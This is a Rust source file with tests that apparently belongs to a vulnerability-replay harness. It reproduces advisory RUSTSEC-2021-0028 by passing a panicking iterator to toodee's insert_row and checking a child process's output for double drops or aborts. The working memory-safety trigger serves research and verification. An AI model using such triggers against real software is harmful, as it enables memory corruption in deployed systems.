use rustdpr_trace::{dpr_function, dpr_hit, install_panic_hook};
use toodee::TooDee;

pub const SITE_TOODEE_INSERT_ROW_BOUNDARY: &str = "S00001";
pub const FN_REPRODUCE_TOODEE: &str = "crate::run_public_api_poc";

#[derive(Debug)]
pub struct DropDetector(pub u32);

impl Drop for DropDetector {
    fn drop(&mut self) {
        // Keep this exact textual pattern: the parent replay test uses it as
        // optional evidence when the platform unwinds instead of aborting.
        println!("Dropping {}", self.0);
    }
}

#[derive(Debug, Default)]
pub struct PanickingIterator;

impl Iterator for PanickingIterator {
    type Item = DropDetector;

    fn next(&mut self) -> Option<Self::Item> {
        panic!("RUSTDPR_TOODEE_ITERATOR_PANIC");
    }
}

impl ExactSizeIterator for PanickingIterator {
    fn len(&self) -> usize {
        1
    }
}

/// Real public-API PoC for RUSTSEC-2021-0028.
///
/// This intentionally mirrors upstream issue #13:
///   let vec = vec![DropDetector(1), DropDetector(2), DropDetector(3)];
///   let mut toodee: TooDee<_> = TooDee::from_vec(1, 3, vec);
///   toodee.insert_row(0, PanickingIterator());
///
/// In vulnerable toodee < 0.3.0, insert_row shifts elements before consuming
/// the iterator. If the iterator panics, ownership/drop state can become
/// inconsistent, causing duplicate drop or platform-specific abort.
pub fn run_public_api_poc() {
    install_panic_hook();
    let _guard = dpr_function!(FN_REPRODUCE_TOODEE);

    let vec = vec![DropDetector(1), DropDetector(2), DropDetector(3)];
    let mut toodee: TooDee<_> = TooDee::from_vec(1, 3, vec);

    dpr_hit!(SITE_TOODEE_INSERT_ROW_BOUNDARY);
    toodee.insert_row(0, PanickingIterator);
}

#[cfg(test)]
mod tests {
    use super::*;
    use rustdpr_trace::init_trace;
    use std::process::{Command, Output};

    fn spawn_child_poc() -> Output {
        let current_exe = std::env::current_exe().expect("current test binary path");
        Command::new(current_exe)
            .env("RUSTDPR_TOODEE_RUN_CHILD", "1")
            .arg("--ignored")
            .arg("__toodee_child_process")
            .arg("--nocapture")
            .output()
            .expect("spawn toodee PoC child process")
    }

    fn child_output_has_replay_evidence(output: &Output) -> bool {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let combined = format!("{stdout}\n{stderr}");

        let duplicate_drop_1 = combined.matches("Dropping 1").count() >= 2;
        let duplicate_drop_2 = combined.matches("Dropping 2").count() >= 2;
        let duplicate_drop_3 = combined.matches("Dropping 3").count() >= 2;

        !output.status.success()
            || duplicate_drop_1
            || duplicate_drop_2
            || duplicate_drop_3
            || combined.contains("RUSTDPR_TOODEE_ITERATOR_PANIC")
            || combined.contains("double free")
            || combined.contains("unsafe precondition")
            || combined.contains("STATUS_STACK_BUFFER_OVERRUN")
    }

    #[test]
    #[ignore = "child process that intentionally triggers the historical toodee insert_row bug"]
    fn __toodee_child_process() {
        if std::env::var("RUSTDPR_TOODEE_RUN_CHILD").ok().as_deref() != Some("1") {
            eprintln!("child PoC test skipped because RUSTDPR_TOODEE_RUN_CHILD is not set");
            return;
        }
        run_public_api_poc();
    }

    #[test]
    #[ignore = "spawns a child process that intentionally triggers the historical toodee bug"]
    fn reproduces_public_advisory() {
        let output = spawn_child_poc();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        assert!(
            !stdout.contains("running 0 tests"),
            "child PoC test was not selected by the test filter.\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}\nSTATUS:{:?}",
            output.status
        );

        assert!(
            child_output_has_replay_evidence(&output),
            "vulnerable toodee PoC did not expose replay evidence.\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}\nSTATUS:{:?}",
            output.status
        );
    }

    #[test]
    #[should_panic(expected = "RUSTDPR_TOODEE_REPLAY_CONFIRMED_AFTER_INSERT_ROW_BOUNDARY")]
    fn rustdpr_deterministic_trace_replay() {
        init_trace("artifacts/trace.jsonl").expect("initialize RustDPR trace");
        install_panic_hook();
        let _guard = dpr_function!(FN_REPRODUCE_TOODEE);

        // API-boundary marker. The true unsafe block lives inside the external
        // toodee 0.2.0 dependency; child-process replay below confirms the real path.
        dpr_hit!(SITE_TOODEE_INSERT_ROW_BOUNDARY);

        let output = spawn_child_poc();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        assert!(
            !stdout.contains("running 0 tests"),
            "child PoC test was not selected by the test filter.\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}\nSTATUS:{:?}",
            output.status
        );

        if child_output_has_replay_evidence(&output) {
            panic!("RUSTDPR_TOODEE_REPLAY_CONFIRMED_AFTER_INSERT_ROW_BOUNDARY");
        }

        panic!("RUSTDPR_TOODEE_REPLAY_UNEXPECTEDLY_SUCCEEDED_AFTER_INSERT_ROW_BOUNDARY");
    }
}
